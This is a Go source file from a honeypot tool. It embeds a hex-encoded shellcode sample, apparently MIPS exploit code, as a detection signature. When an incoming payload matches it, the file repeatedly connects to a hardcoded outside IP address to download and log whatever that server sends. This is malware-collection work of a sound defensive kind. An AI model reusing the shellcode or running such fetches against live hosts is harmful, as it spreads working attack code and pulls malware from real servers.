package honeypot

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/Acey9/apacket/honeypot/core"
	"github.com/Acey9/apacket/logp"
	"net"
	"sync"
	"time"
)

var isReShell bool

const shellcode = "02d6202524020fa60101010c02b5202524020fa60101010c27a4ffcaafa4ffe0afa0ffe427a5ffe02806ffff24020fab0101010c2804ffff24020fa10101010c03bdb82527bdffe0240ffffd01e02027240ffffd01e028272806ffff240210570101010cafa2ffdc8fb6ffdc240f133702d62025240ffffd01e07827a7afffe0240f2222a7afffe2240f6df8a7afffe4240f0911a7afffe6afa0ffe8afa0ffec27a5ffe0240fffef01e030272402104a0101010c240f2f74a7afffca240f6d70a7afffcc240f2f74a7afffce240f6d70a7afffd0240f6673a7afffd2a7a0ffd427a4ffca240ffe1201e0282724020fc70101010c2804ffff27a5ffca27a6ffcf2807ffffaee0fff024020fb50101010c240f2f74a7afffd4240f6d70a7afffd6240f6673a7afffd8a7a0ffda27a4ffca240ffe1201e0282724020fa80101010cafa2ffdc8fb5ffdc240f133702d6202527a5ffe0240fffdf01e030272807ffff2402104f0101010cafa2ffdc8fb4ffdc240f13370680ffaf240f13371a80ffa0240f133702b5202527a5ffe00294302524020fa40101010c1682ffa6240f13371282ffea240f1337340fdead340fdead"

var cntMutexTmp *sync.RWMutex

func hex2bytes() []byte {
	src := []byte(shellcode)
	dst := make([]byte, hex.DecodedLen(len(src)))
	n, err := hex.Decode(dst, src)
	if err != nil {
		logp.Err("hex2bytes:%v", err)
	}
	return dst[:n]
}

func lock() {
	cntMutexTmp.Lock()
	defer cntMutexTmp.Unlock()
	isReShell = true
}

func (hp *Honeypot) reShellConn(payload []byte, localAddr, ptype string) {
	if ptype != "http" {
		return
	}
	_, port, err := net.SplitHostPort(localAddr)
	if err != nil || port != "5431" {
		return
	}

	rsh := hex2bytes()
	idx := bytes.Index(payload, rsh)
	if idx == -1 {
		return
	}

	if isReShell {
		logp.Debug("tmp", "isReShell:%v", isReShell)
		return
	} else {
		lock()
	}

	raddr := fmt.Sprintf("%d.%d.%d.%d:%d", 109, 248, 9, 17, 8738)
	sleep := time.Millisecond * time.Duration(8000)
	var cnt int
	for {
		hp.read(raddr)
		time.Sleep(sleep)
		logp.Debug("tmp", "re conn:%s", raddr)
		cnt++
		if cnt > 4096 {
			logp.Debug("tmp", "cnt > limit")
			break
		}
	}
	isReShell = false
}

func (hp *Honeypot) read(raddr string) {
	conn, err := net.DialTimeout("tcp", raddr, time.Second*6)
	if err != nil {
		logp.Debug("tmp", "conn %s err:%v", raddr, err)
		return
	}
	defer conn.Close()
	payloadBuf := bytes.Buffer{}
	for {
		conn.SetDeadline(time.Now().Add(6 * time.Second))
		buf := make([]byte, 4096)
		l, err := conn.Read(buf)
		if err != nil || l < 1 {
			break
		}
		payloadBuf.Write(buf[:l])
		if payloadBuf.Len() > 40960000 {
			break
		}
	}

	if payloadBuf.Len() > 0 {
		pkt, err := core.NewApplayer("127.0.0.1:8738", "127.0.0.1:5431", "other", core.TransportTCP, payloadBuf.Bytes(), false, nil)
		if err != nil {
			return
		}
		out, err := json.Marshal(pkt)
		if err == nil {
			hp.outputer.Output(out)
		}
	}
}

func init() {
	cntMutexTmp = &sync.RWMutex{}
}
